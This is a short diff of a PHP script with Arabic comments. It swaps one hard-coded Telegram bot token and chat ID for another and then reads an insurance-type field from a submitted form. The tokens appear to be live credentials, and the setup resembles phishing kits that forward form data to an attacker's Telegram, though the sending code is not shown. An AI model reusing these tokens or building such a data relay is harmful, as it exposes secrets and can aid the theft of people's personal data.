@@ -1,7 +1,7 @@
 <?php
 // إعدادات التليجرام
-define('BOT_TOKEN', '8716166611:AAFMgUb2iMpmWozRF2iuooR661v19EKjiKs');
-define('CHAT_ID', '8535558521');
+define('BOT_TOKEN', '8704097667:AAEyGWEvC66L2GSK7x-yezV-GG7uJ7E0ISw');
+define('CHAT_ID', '8053385893');
 
 // استقبال البيانات من النموذج
 $insurance_type = isset($_POST['insurance_type']) ? $_POST['insurance_type'] : '';
